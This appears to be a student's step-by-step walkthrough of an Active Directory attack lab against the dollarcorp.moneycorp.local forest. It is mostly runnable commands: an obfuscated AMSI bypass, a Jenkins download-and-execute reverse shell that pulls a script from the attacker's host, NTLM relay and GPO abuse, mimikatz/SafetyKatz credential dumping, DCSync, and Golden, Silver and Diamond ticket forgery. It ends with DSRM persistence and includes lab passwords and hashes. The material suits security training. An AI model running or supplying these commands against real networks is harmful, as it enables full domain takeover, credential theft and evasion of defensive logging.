# THE Environment :

- Your machine VM hostname could be dcorp-studentx or dcorp-stdx.
- Your machine in **dollarcorp.moneycorp.local** domain , and there are parent domain **moneycorp.local** and child domain **us.dollarcorp.moneycorp.local**
- in **dollarcorp.moneycorp.local** domain ,  there are 6 servers :
	- dcorp-dc : domain controller
	- dcorp-ci , dcorp-mgmt , dcorp-mssql , dcorp-adminsrv , dcorp-appsrv , dcorp-sql1
- in **moneycorp.local** domain ,  there is 1 domain controller : mcorp-dc
- in **us.dollarcorp.moneycorp.local** domain ,  there is 1 domain controller : us-dc
- there is another forest **eurocorp.local** there is 1 domain controller : eurocorp-dc
- **eurocorp.local** domain has one child domain **eu.eurocorp.local** , which have two servers : eu-sql and eu-dc (domain controller)

---

Please remember to turn-off or add an exception to your student VMs firewall when your run listener for a reverse shell.

AMSI bypass:
```
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GetvarI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f'.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"(( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}"-f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

We will use Invisi-Shell (https://github.com/OmerYa/Invisi-Shell) for bypassing the security controls in PowerShell and to avoid enhanced logging

We will use PowerView (https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1) for enumerating the domain


#### Objective 1:

[Enumerate following for the dollarcorp domain: Users, Computers, Domain Administrators, Enterprise Administrators]

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\PowerView.ps1
```

```
Get-DomainUser | select -ExpandProperty samaccountname

Get-DomainComputer | select -ExpandProperty dnshostname

Get-DomainGroupMember -Identity "Domain Admins"

Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```


[Use BloodHound]
BloodHound uses neo4j graph database, so that needs to be set up first.
Note: Exit BloodHound once you have stopped using it as it uses good amount of RAM. You may also like to stop the neo4j service if you are not using BloodHound.
We need to install the neo4j service. Unzip the archive C:\AD\Tools\neo4j-community-4.1.1-windows.zip

Run BloodHound ingestores to gather data and information about the current domain.

```
C:\AD\Tools\BloodHound-master\BloodHoundmaster\Collectors\SharpHound.exe --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets --excludedcs
```


[Find a file share where studentx has Write permissions]
We will use PowerHuntShares (https://github.com/NetSPI/PowerHuntShares). to search for file shares where studentx has Write permissions.
We will not scan the domain controller for Writable shares for a better OPSEC.
we will add all servers (without the domain controller) in servers.txt

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

Import-Module C:\AD\Tools\PowerHuntShares.psm1

Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt
```

You need to copy the summary report to your host machine because the report needs interent access.

#### Objective 2:

[Enumerate following for the dollarcorp domain: ACL for the Domain Admins group - ACLs where studentx has interesting permissions]

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\PowerView.ps1

Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose

Find-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match "studentx"}
```

Since studentx is a member of the RDPUsers group, let us check permissions for it

```
Find-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match "RDPUsers"}
```

#### Objective 3:

Enumerate following for the dollarcorp domain:
- List all the OUs
- List all the computers in the DevOps OU
- List the GPOs
- Enumerate GPO applied on the DevOps OU
- Enumerate ACLs for the Applocked and DevOps GPOs

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\PowerView.ps1

Get-DomainOU | select -ExpandProperty name

(Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name

Get-DomainGPO
```

to enumerate GPO applied on the DevOps OU, we need the name of the policy from the gplink attribute from the OU:
```
(Get-DomainOU -Identity DevOps).gplink
```
we get : [LDAP://cn={0BF8D01C-1F62-4BDC-958C-57140B67D147},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
then run :
```
Get-DomainGPO -Identity '{0BF8D01C-1F62-4BDC-958C-57140B67D147}'
```

It is possible to hack both the commands together in a single command (profiting from the static length for GUIDs):
```
Get-DomainGPO -Identity (Get-DomainOU -Identity DevOps).gplink.substring(11,(Get-DomainOU -Identity DevOps).gplink.length-72)
```

#### Objective 4:

[Enumerate all domains in the moneycorp.local forest]
```powershell
Get-ForestDomain -Verbose
```

[Map the trusts of the dollarcorp.moneycorp.local domain.]
to list only the external trusts in the moneycorp.local forest:
```powershell
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} |?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

[Map External trusts in moneycorp.local forest]
To identify external trusts of the dollarcorp domain:
```powershell
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

[Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?]
We either need bi-directional trust or one-way trust from eurocorp.local to dollarcorp to be able to extract information from the eurocorp.local forest :
```powershell
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
```

#### Objective 5:

[Exploit a service on dcorp-studentx and elevate privileges to local administrator.]
We can use Powerup from PowerSploit module to check for any privilege escalation path.

Tools for privilege escalation :
- PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- Privesc: https://github.com/itm4n/PrivescCheck
- winPEAS - https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

Run all checks from :
- PowerUp
```powershell
Invoke-AllChecks
```
- Privesc:
```powershell
Invoke-PrivEscCheck
```
- PEASS-ng:
```powershell
winPEASx64.exe
```


```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\PowerUp.ps1

Invoke-AllChecks
```

#unquoted_service_attack

to abuse function for Invoke-ServiceAbuse and add our current domain user to the local Administrators group.

```powershell
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName'dcorp\studentx' -Verbose
```
and Just logoff and logon again

Local Privilege Escalation by using WinPEAS
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log
```

Local Privilege Escalation by using PrivEscCheck
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\PrivEscCheck.ps1

Invoke-PrivescCheck
```


[Identify a machine in the domain where studentx has local administrative access.]
we will use Find-PSRemotingLocalAdminAccess.ps1
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1

Find-PSRemotingLocalAdminAccess
```

studentx has administrative access on dcorp-adminsrv and on the student machine. We can connect to dcorp-adminsrv using winrs as the student user

```powershell
winrs -r:dcorp-adminsrv cmd
```
and run these command to check :
```powershell
set username
set computername
```

We can also use PowerShell Remoting:
``` powershell
Enter-PSSession -ComputerName dcorpadminsrv.dollarcorp.moneycorp.local
```


[Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 the dcorp-ci server]

Jenkins on dcorp-ci (http://172.16.3.11:8080).
Use the encodedcomand parameter of PowerShell to use an encoded reverse shell or use download execute cradle in Jenkins build step. You can use any reverse shell, below we are using a slightly modified version of Invoke-PowerShellTcp from Nishang. We renamed the function Invoke-PowerShellTcp to Power in the script to bypass Windows Defender.

If using Invoke-PowerShellTcp, make sure to include the function call in the script Power -Reverse - IP Address 172.16.100.X -Port 443 or append it at the end of the command in Jenkins.

``` powershell
powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
```
Remember to host the reverse shell on a local web server on your machine VM using **hfs.exe**

run a netcat or powercat listener
```powershell
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```

Now you get Windows PowerShell running as user **ciadmin** on **DCORP-CI**



%% 
## until now , We know that

1- members of the Domain Admins group : svcadmin and Administrator
2- members of the Enterprise Admins group : Administrator
3- File share where studentx has Write permissions : there is a directory named 'AI' on dcorp-ci where 'BUILTIN\Users' has 'WriteData/Addfile' permissions ('Everyone' has privileges on the 'AI' folder)
4- studentx has admin privileges at dcorp-adminsrv
5- studentx is a member of the RDPUsers group
6- Due to the membership of the RDPUsers group, the studentx user has following interesting permissions:
- Full Control/Generic All over supportx and controlx users.
- Enrollment permissions on multiple certificate templates.
- Full Control/Generic All on the Applocked Group Policy.
7- A user named 'devopsadmin' has 'WriteDACL' on DevOps Policy.
8- by using #unquoted_service_attack studentx in the local Administrators group @ dcorp-studentx machine
9- by using bug in Jenkins you get Windows PowerShell running as user **ciadmin** on **DCORP-CI**

Now !! you are Administrator @ dcorp-studentx and dcorp-adminsrv machines and can use ciadmin Admin user at DCORP-CI
	- dcorp-studentx (Pwned)
	- dcorp-dc
	- dcorp-ci (Pwned)
	- dcorp-mgmt
	- dcorp-mssql
	- dcorp-adminsrv (Pwned)
	- dcorp-appsrv
	- dcorp-sql1

%%




#### Objective 6:


[Abuse an overly permissive Group Policy to get admin access on dcorp-ci]

we will use a directory called 'AI' on the dcorp-ci machine where 'Everyone' has access.
It turns out that the 'AI' folder is used for testing some automation that executes shortcuts (.lnk files) as the user 'devopsadmin'. 
Recall that we enumerated a user 'devopsadmin' has 'WriteDACL' on DevOps Policy. Let's try to abuse this using GPOddity (https://github.com/synacktiv/GPOddity).

we will use ntlmrelayx tool (https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) from Ubuntu WSL instance on the student VM to relay the credentials of the devopsadmin user.
```powershell
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server
```

now let's create a Shortcut that connects to the ntlmrelayx listener and add this location :
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.x' -UseDefaultCredentials"
```

now let's copy this file to AI folder :
```
xcopy C:\AD\Tools\studentx.lnk \\dcorp-ci\AI
```

after a successful connection, we will Connect to the ldap shell started on port 11000.
```
nc 127.0.0.1 11000
```

Using this ldap shell, we will provide the studentx user, WriteDACL permissions over Devops Policy {0BF8D01C-1F62-4BDC-958C-57140B67D147}:
```
# write_gpo_dacl studentx {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```
if we do not have access to any doman users, we can add a computer object and provide it the 'write_gpo_dacl' permissions on DevOps policy

```
# add_computer stdx-gpattack Secretpass@123

# write_gpo_dacl stdx-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

Stop the ldap shell and ntlmrelayx using Ctrl + C.
Now, run the GPOddity command to create the new template.
```
cd /mnt/c/AD/Tools/GPOddity

sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'studentx' --password 'gG38Ngqym2DpitXuGrsJ' --command 'net localgroup administrators student /add' --rogue-smbserver-ip '172.16.100. x' --rogue-smbserver-share 'stdx-gp' --dc-ip '172.16.2.1' --smb-mode none
```

create and share the stdx-gp directory
```
mkdir /mnt/c/AD/Tools/stdx-gp

cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/stdx-gp
```

(Run as Administrator) on the student
```
net share std1-gp=C:\AD\Tools\stdx-gp

icacls "C:\AD\Tools\stdx-gp" /grant Everyone:F /T
```

Now **studentx** should be added to the local administrators group on **dcorp-ci**

#### Objective 7:

[Identify a machine in the target domain where a Domain Admin session is available]
We can use Invoke-SessionHunter.ps1 (https://github.com/Leo4j/Invoke-SessionHunter) from the student VM to list sessions on all the remote machines.

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\Invoke-SessionHunter.ps1

Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
```

from the result , There is a domain admin (svcadmin) session on dcorp-mgmt server

Second Way :

we will write bypass AMSI in txt file and use HFS.exe to host the sbloggingbypass.txt on a web server on the student VM if you use the download-exec cradle
```
iex (iwr http://172.16.100.x/sbloggingbypass.txt -UseBasicParsing)
```

First bypass Enhanced Script Block Logging so that the AMSI bypass is not logged. We could also use these bypasses in the initial download-execute cradle that we used in Jenkins.
The below command bypasses Enhanced Script Block Logging. Unfortuantely, we have no in-memory bypass for PowerShell transcripts. Note that we could also paste the contents of sbloggingbypass.txt in place of the download-exec cradle.

and to use Powerview :
```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))

Find-DomainUserLocation
```
from the result , There is a domain admin session on dcorp-mgmt server



[Compromise the machine and escalate privileges to Domain Admin by abusing reverse shell on dcorp-ci]



we will use user **ciadmin** on **DCORP-CI** to check if we can execute commands on dcorp-mgmt server and if the winrm port is open
```
winrs -r:dcorp-mgmt cmd /c "set computername && set username"
```
result: COMPUTERNAME=DCORP-MGMT & USERNAME=ciadmin

We would now run SafetyKatz.exe on dcorp-mgmt to extract credentials from it.
Let's download Loader.exe on dcorp-ci and copy it from there to dcorp-mgmt.
```
iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe

echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt
```
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
```
Please note that we must use the $null variable to address output redirection issues.

To run SafetyKatz on dcorp-mgmt, we will download and execute it in-memory using the Loader
```
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```
from the result , we will get **aes256_hmac**
We got credentials of svcadmin - a domain administrator

Note that svcadmin is used as a service account (see "Session" in the above output), so you can even get credentials in clear-text from lsasecrets (https://github.com/samratashok/nishang/blob/master/Gather/Get-LSASecret.ps1)

Finally, use OverPass-the-Hash to use svcadmin's credentials.
Run the commands below from an elevated shell on the student VM to use Rubeus.
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

winrs -r:dcorp-dc cmd /c set username
```

Now, we have **svcadmin** user on **dcorp-mgmt** server



[Escalate privilege to DA by abusing derivative local admin through dcorp-adminsrv.]

as we know We have local admin on the dcorp-adminsrv. but when You try to run Loader.exe (to run SafetKatz from memory) results in error 'This program is blocked by group policy For more information, contact your system administrator'.
and Any attempts to run Invoke-Mimi on dcorp-adminsrv results in errors about language mode.
This could be because of an application allowlist on dcorp-adminsrv and we drop into a Constrained Language Mode (CLM) when using PSRemoting.

Let's check if Applocker is configured on dcorp-adminsrv by querying registry keys. Note that we are assuming that reg.exe is allowed to execute:
```
winrs -r:dcorp-adminsrv cmd

reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2

reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454fa263-2515c8796a5d
```
Looks like Applocker is configured. After going through the policies, we can understand that Microsoft Signed binaries and scripts are allowed for all the users but nothing else. However, this particular rule is overly permissive!

the result : All scripts located in the Program Files folder" Description="Allows members of the Everyone group to run scripts that are located in the Program Files folder"

A default rule is enabled that allows everyone to run scripts from the C:\ProgramFiles folder!

Second Way to confirm :
```
Enter-PSSession dcorp-adminsrv

$ExecutionContext.SessionState.LanguageMode

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

we can drop scripts in the Program Files directory there and execute them.
we must modify Invoke-Mimi.ps1 to include the function call in the script itself and transfer the modified script (Invoke-MimiEx.ps1) to the target server.
Add the below encoded value for "sekurlsa::ekeys" to the end of the file.
```powershell
$8 = "s";
$c = "e";
$g = "k";
$t = "u";
$p = "r";
$n = "l";
$7 = "s";
$6 = "a";
$l = ":";
$2 = ":";
$z = "e";
$e = "k";
$0 = "e";
$s = "y";
$1 = "s";
$Pwn = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s +
$1 ;
Invoke-Mimi -Command $Pwn
```


```
Copy-Item C:\AD\Tools\Invoke-MimiEx-keys-stdx.ps1 \\dcorpadminsrv.dollarcorp.moneycorp.local\c$\'Program Files'

.\Invoke-MimiEx-keys-stdx.ps1
```
we will get the **aes256_hmac**
Here we find the credentials of the **dcorp-adminsrv$**, **appadmin** and **websvc** users.



Let’s modify Invoke-MimiEx and look for credentials from the Windows Credential Vault.
Replace "Invoke-Mimi -Command '"sekurlsa::ekeys"' " that we added earlier with **Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'** 

then copy them to the machine like Invoke-MimiEx-keys-stdx.ps1 and run it
we will get the clear text password of **srvadmin** : **TheKeyUs3ron@anyMachine!**

Check if srvadmin has admin privileges on any other machine.
```
runas /user:dcorp\srvadmin /netonly cmd

C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1

Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
```

Let's use SafetyKatz to extract credentials from the machine.
```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorpmgmt\C$\Users\Public\Loader.exe

winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
```
now we get **aes256_hmac**

[Disable Applocker on dcorp-adminsrv by modifying GPO]
using Gui by gpmc.msc



%% 
## until now , We know that

1- members of the Domain Admins group : **svcadmin and Administrator**
2- members of the Enterprise Admins group : Administrator
3- File share where studentx has Write permissions : there is a directory named 'AI' on dcorp-ci where 'BUILTIN\Users' has 'WriteData/Addfile' permissions ('Everyone' has privileges on the 'AI' folder)
4- studentx has admin privileges at dcorp-adminsrv
5- studentx is a member of the RDPUsers group
6- Due to the membership of the RDPUsers group, the studentx user has following interesting permissions:
- Full Control/Generic All over supportx and controlx users.
- Enrollment permissions on multiple certificate templates.
- Full Control/Generic All on the Applocked Group Policy.
7- A user named 'devopsadmin' has 'WriteDACL' on DevOps Policy.
8- by using #unquoted_service_attack studentx in the local Administrators group @ dcorp-studentx machine
9- by using bug in Jenkins you get Windows PowerShell running as user **ciadmin** on **DCORP-CI**

1- **studentx** should be added to the local administrators group on **dcorp-ci**
2- we have **svcadmin** user on **dcorp-mgmt** server
3- we find the credentials of the **dcorp-adminsrv$**, **appadmin** and **websvc** users.
4- **srvadmin** : **TheKeyUs3ron@anyMachine!**

Now !! you are Administrator @ dcorp-studentx and dcorp-adminsrv machines and can use ciadmin Admin user at DCORP-CI
	- dcorp-studentx (Pwned)
	- dcorp-dc
	- dcorp-ci (Pwned)
	- dcorp-mgmt ==(Pwned)==
	- dcorp-mssql
	- dcorp-adminsrv (Pwned)
	- dcorp-appsrv
	- dcorp-sql1

%%


#### Objective 8:


[Extract secrets from the domain controller of dollarcorp.]

(Run as administrator) to start a process with Domain Admin privileges:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

to extract credentials:
```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorpdc\C$\Users\Public\Loader.exe /Y

winrs -r:dcorp-dc cmd

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"

mimikatz # lsadump::lsa /patch
```
now we get the NTLM of  Administrator and krbtgt

To get NTLM hash and AES keys of the krbtgt account, we can use the #DCSync_attack. Run the below command from process running as Domain Admin on the student VM:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```
now we get : aes256_hmac of krbtgt account

%% 
### DCSync Attack

In Active Directory, there's a legitimate feature called **directory replication**. It's how different Domain Controllers (DCs) sync user data between themselves to stay consistent.

The attacker **abuses this legitimate feature** by:
1. **Pretending to be a Domain Controller** - They use stolen administrator privileges to pose as a legitimate DC
2. **Requesting a "sync"** - They ask a real Domain Controller: _"Please send me the password hashes for these specific users"_
3. **Getting the crown jewels** - The real DC, thinking it's talking to another legitimate DC, sends over the **NTLM password hashes** (and sometimes Kerberos keys) for the requested users

%%

[Using the secrets of krbtgt account, create a Golden ticket.]

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd

C:\AD\Tools\Loader.exe Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD
```

[Use the Golden ticket to (once again) get domain admin privileges from a machine.]

Now, use the generated command to forge a Golden ticket. Remember to add "-path
C:\AD\Tools\Rubeus.exe -args" after Loader.exe and /ptt at the end of the generated
command to inject it in the current process. Once the ticket is injected, we can access resources in the
domain:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```


%% 
### Golden Ticket Attack

Think of a Golden Ticket as a **master key to an entire office building**, forged by someone who stole the building manager's personal stamp.
Here’s how it works in simple terms:

1. **Steal the Master Stamp:** The attacker first gets the password hash for a special domain account called `KRBTGT`. This account is like the building's master security system—it's used to stamp every single official access pass. Stealing this hash is the critical first step.
2. **Forge a Master Access Pass:** Using the stolen `KRBTGT` hash, the attacker can now create their own Ticket-Granting Ticket (TGT). They have complete control over what they write on it. They can make the ticket for **any user** (even a fake one), give it **any level of permission** (like Domain Admin), and set it to **last for years**.
3. **The Stamp Looks Real:** Because they used the real `KRBTGT` hash to "stamp" (cryptographically sign) the ticket, the forgery is perfect. To any door or service in the building (the network), the stamp appears 100% legitimate.
4. **Unlimited Access Anywhere:** The attacker can now present this forged Golden Ticket to any service—file servers, email, databases. The service checks the stamp, sees it's from the real master account, and grants full access without question. They can even use it to create more tickets for other services.
5. **Persistent and Hard to Stop:** The attacker can make the ticket last for 10 years. Even if the victim company resets all user passwords, the Golden Ticket still works because it's based on the `KRBTGT` hash, not a user password. The only way to stop it is to reset the `KRBTGT` password twice, which is a major operation.

%%
#### Objective 9:

[creating silver ticket for HTTP, WMI]

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```
that the hash of dcorp-dc$ (RC4 in the command)

For accessing WMI, we need to create two tickets - one for HOST service and another for RPCSS.
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

We can check if we got the correct service ticket
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
```

%% 
### Silver Ticket Attack

Think of a Silver Ticket as a **forged key to a specific room** in a building, bypassing the main security desk entirely.
Here’s how it works in simple terms:

1. **Target One Specific Service:** Unlike a Golden Ticket, which forges a master key for the entire building, a Silver Ticket is aimed at one particular service—like a file server, a database, or a web application inside the company network.
2. **Use the Service’s Own Password:** To make the key, the attacker needs the password hash for the service account that runs that specific machine or application. They often get this from a previously compromised computer’s memory or from other attacks.
3. **Forge a Service Ticket:** With that hash, the attacker can craft their own service ticket. This ticket says, “This user has access,” and it’s stamped with the service’s own “signature” (because the attacker used the service account’s password to create it).
4. **Bypass the Main Security:** Normally, when you want to access a service, you go to the central security desk (the Domain Controller) to get a valid ticket. With a Silver Ticket, the attacker skips that step completely. They go straight to the service and present their forged ticket.
5. **The Service Accepts It:** The service checks the ticket’s signature using its own stored password. Since the ticket was made with the correct password hash, the signature looks valid. The service accepts it and grants access—without ever checking back with the main security desk.

%%
#### Objective 10:

[Use Domain Admin privileges obtained earlier to execute the Diamond Ticket attack.]

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

%% 
### Diamond Ticket Attack

Think of a Diamond Ticket as a **forged VIP pass** that's half real and half fake, making it very hard to catch.
Here's how it works in simple terms:

1. **Start with a Real Ticket:** An attacker first gets a normal, legitimate entry pass (a Kerberos ticket) for a regular user. This ticket was officially issued by the security office (the Domain Controller) and has its official stamp (cryptographic signature).
2. **The Sneaky Alteration:** Instead of making a fake pass from scratch, the attacker carefully alters this real pass. They use the domain's master key (the KRBTGT hash, which they previously stole) to open the ticket and change its critical details. They might upgrade the user's permissions on the ticket to "Administrator" or change the issued date to make it last for years.
3. **The Clever Trick:** The attacker is very careful to keep the security office's **original official stamp** intact and untouched. They only change the information _inside_ the ticket.
4. **The Result:** They now have a ticket that says "VIP Administrator Access Forever," but it still carries the security office's genuine, trusted stamp. When they show this pass to any door in the building (any service on the network), the system checks the stamp, sees it's real, and lets them in with full admin rights.

%%

#### Objective 11:

[Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.]

Start a process with domain admin privileges:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

echo F | xcopy C:\AD\Tools\Loader.exe \\dcorpdc\C$\Users\Public\Loader.exe /Y

winrs -r:dcorp-dc cmd

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"

mimikatz(commandline) # token::elevate
mimikatz(commandline) # lsadump::evasive-sam
```
we get :
User : Administrator
Hash NTLM: a102ad5753f4c441e3af31c97fad86fd

The DSRM administrator is not allowed to logon to the DC from network. So, we need to change the logon behavior for the account by modifying registry on the DC.
```
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```

Now on the student VM, we can use Pass-The-Hash (not OverPass-The-Hash) for the DSRM administrator:
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe" "exit"
```

From the new procees, we can now access dcorp-dc. Note that we are using PowerShell Remoting with
IP address and Authentication - 'NegotiateWithImplicitCredential' as we are using NTLM authentication.
So, we must modify TrustedHosts for the student VM. Run the beklow command from an elevated
PowerShell session:
```
Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1

C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

